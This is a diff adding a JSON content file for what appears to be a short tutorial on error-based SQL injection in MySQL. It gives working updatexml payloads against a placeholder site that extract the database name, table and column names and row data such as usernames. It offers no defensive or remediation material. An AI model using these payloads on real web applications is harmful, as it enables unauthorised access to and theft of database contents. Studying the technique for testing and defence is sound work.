@@ -1,0 +1,138 @@
+[
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "What is ERROR BASED SQLI injecton attack?"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "Error Based SQLI is a type of injection attack where we can get database content from errors, to test if a webApp is vulnerable or no we can run the following command."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "`'` if you use this and if you get mysql syntax error then bingo there is ERROR BASED injection in the web app."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "How to See the Database?"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "From its name it is quite obvious, we can see the content by triggering an error."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,database(),0x7e),1)"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "By running above command you will see the database name as expected"
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~sqli_one~'"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Here we used updatexml function which will ofc give us the error and we concat the database name with ~ to be more visible, we use this function because it give us some content rather than just telling there is an error. So this function expects something like this updatexml(xml_target, xpath_expression, new_value) we used 1 and 1 in place of xml_target and new_value let's try to understand these paramteres."
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "xml_target: So basically this function expects first param to be an xml document so we just gave it 1 to generate an error."
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "xpath_expression: It is the basically the parameter which is ging to parse by the MYSQL."
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "new_value: So this is the thing which will happen after successful parsing so we wrote 1 because we don't need it, you can write any useless thing in first and last parameter."
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "Important Note: The first and last parameter can be anything which is a valid sql but not a valid xml because we want invalid xml so that it fails."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Enumerate Tables"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the database name so we will try to get the table names, you cannot get table names from basic sql syntax you need the below command to make it work."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema='sqli_one' LIMIT 0,1),0x7e),1)"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "So from above command you can see the table names of the database."
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Reading Columns"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the table name, now we will ready it's column names, use the below command for that."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='article' LIMIT 0,1),0x7e),1)"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "This is pretty straight forward this will give you the column name"
+      },
+      {
+        "type": "section_heading",
+        "id": "initial-access",
+        "text": "Reading Rows"
+      },
+      {
+        "type": "paragraph",
+        "id": "error-based-sqli-definition",
+        "text": "We have the column name, now we can read that column data, from here you have everything so you can use normal msql query."
+      },
+      {
+        "type": "code_block",
+        "id": "checking-command",
+        "language": "bash",
+        "code": "http://www.test.com?id=1 AND updatexml(1,concat(0x7e,(SELECT username FROM article LIMIT 0,1),0x7e),1)"
+      },
+      {
+        "type": "paragraph",
+        "id": "further-details",
+        "text": "This is also pretty straight forward this will give you the row data"
+      }
+    ]
